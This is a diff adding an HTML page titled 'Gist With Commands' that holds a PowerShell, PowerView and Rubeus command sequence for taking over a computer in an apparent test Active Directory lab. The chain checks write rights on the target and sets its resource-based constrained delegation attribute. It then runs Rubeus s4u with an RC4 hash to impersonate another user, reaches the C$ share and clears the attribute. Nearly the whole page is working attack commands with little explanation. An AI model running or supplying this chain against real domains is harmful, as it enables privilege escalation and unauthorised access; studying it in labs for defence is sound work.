@@ -1,0 +1,55 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Gist With Commands</title>
+</head><body># the target computer object we're taking over<br/>
+$TargetComputer = "primary.testlab.local"<br/>
+<br/>
+# find targets with S4U2Self enabled<br/>
+Get-DomainObject -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=16777216)' -Properties samaccountname,useraccountcontrol | fl<br/>
+<br/>
+# get our attacker's SID (account with rights over the target)<br/>
+$AttackerSID = Get-DomainUser attacker -Properties objectsid | Select -Expand objectsid<br/>
+<br/>
+# verify the GenericWrite permissions on $TargetComputer<br/>
+$ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}<br/>
+$ACE<br/>
+ConvertFrom-SID $ACE.SecurityIdentifier<br/>
+<br/>
+<br/>
+<br/>
+# the identity we control that we want to grant S4U access to the target<br/>
+$S4UIdentity = "TESTLAB\constraineduser"<br/>
+<br/>
+# translate the identity to a security identifier<br/>
+$IdentitySID = ((New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $S4UIdentity).Translate([System.Security.Principal.SecurityIdentifier])).Value<br/>
+<br/>
+# substitute the security identifier into the raw SDDL<br/>
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($IdentitySID))"<br/>
+<br/>
+# get the binary bytes for the SDDL<br/>
+$SDBytes = New-Object byte[] ($SD.BinaryLength)<br/>
+$SD.GetBinaryForm($SDBytes, 0)<br/>
+<br/>
+# set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'<br/>
+Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose<br/>
+<br/>
+# check that the ACE added correctly<br/>
+$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity<br/>
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0<br/>
+$Descriptor.DiscretionaryAcl<br/>
+ConvertFrom-SID $Descriptor.DiscretionaryAcl.SecurityIdentifier<br/>
+<br/>
+<br/>
+<br/>
+# execute Rubeus' s4u process against $TargetComputer<br/>
+whoami<br/>
+dir \\primary.testlab.local\C$<br/>
+Rubeus.exe s4u /user:constraineduser /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:harmj0y /msdsspn:cifs/primary.testlab.local /ptt<br/>
+dir \\primary.testlab.local\C$<br/>
+<br/>
+<br/>
+<br/>
+# clear the 'msds-allowedtoactonbehalfofotheridentity' security descriptor out<br/>
+Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose</body></html>
